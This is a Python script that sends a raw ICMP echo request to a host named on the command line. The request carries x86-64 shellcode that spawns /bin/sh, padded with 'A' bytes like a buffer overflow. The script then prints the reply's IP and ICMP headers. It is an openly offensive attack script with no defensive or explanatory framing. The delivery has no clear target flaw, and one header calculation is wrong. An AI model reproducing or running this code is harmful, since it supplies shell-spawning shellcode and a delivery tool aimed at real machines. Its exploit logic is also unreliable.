import socket
import struct
import os
import ctypes

BUFFER_SIZE = 1024

def in_cksum(packet):
    sum = 0
    count_to = (len(packet) // 2) * 2
    count = 0
    while count < count_to:
        this_val = packet[count + 1] * 256 + packet[count]
        sum += this_val
        sum &= 0xffffffff
        count += 2

    if count_to < len(packet):
        sum += packet[len(packet) - 1]
        sum &= 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum += (sum >> 16)
    answer = ~sum
    answer &= 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def main():
    import sys

    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip_address>")
        sys.exit(1)

    # create raw socket for ICMP communication
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, 255)

    # create destination address tuple
    dest_addr = (sys.argv[1], 0)

    # construct ICMP packet with shellcode
    icmp_header = struct.pack("BBHHH", 8, 0, 0, os.getpid() & 0xFFFF, 1)
    shellcode = b"\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"
    packet_buffer = icmp_header + shellcode + b'A' * (BUFFER_SIZE - len(icmp_header) - len(shellcode))

    # calculate ICMP checksum
    checksum = in_cksum(packet_buffer)
    icmp_header = struct.pack("BBHHH", 8, 0, socket.htons(checksum), os.getpid() & 0xFFFF, 1)
    packet_buffer = icmp_header + shellcode + b'A' * (BUFFER_SIZE - len(icmp_header) - len(shellcode))

    # send ICMP packet to destination
    icmp_socket.sendto(packet_buffer, dest_addr)

    # receive ICMP packet response
    response_buffer, _ = icmp_socket.recvfrom(BUFFER_SIZE)

    # extract IP header and ICMP header from response packet
    ip_header = struct.unpack("!BBHHHBBH4s4s", response_buffer[:20])
    icmp_response = struct.unpack("BBHHH", response_buffer[20:28])

    # extract quoted packet if present
    quoted_packet = None
    if icmp_response[0] == 3 or icmp_response[0] == 11:
        quoted_packet = response_buffer[28:]

    # process IP and ICMP headers
    print("IP Header:")
    print(f"  Version: {ip_header[0] >> 4}")
    print(f"  Header length: {ip_header[0] & 0xF * 4} bytes")
    print(f"  TTL: {ip_header[5]}")
    print(f"  Protocol: {ip_header[6]}")
    print(f"  Source address: {socket.inet_ntoa(ip_header[8])}")
    print(f"  Destination address: {socket.inet_ntoa(ip_header[9])}")

    print("\nICMP Header:")
    print(f"  Type: {icmp_response[0]}")
    print(f"  Code: {icmp_response[1]}")
    print(f"  Checksum: {icmp_response[2]}")

    # print quoted packet if present
    if quoted_packet:
        print("\nQuoted Packet:")
        print(quoted_packet.decode(errors='ignore'))

    icmp_socket.close()

if __name__ == "__main__":
    main()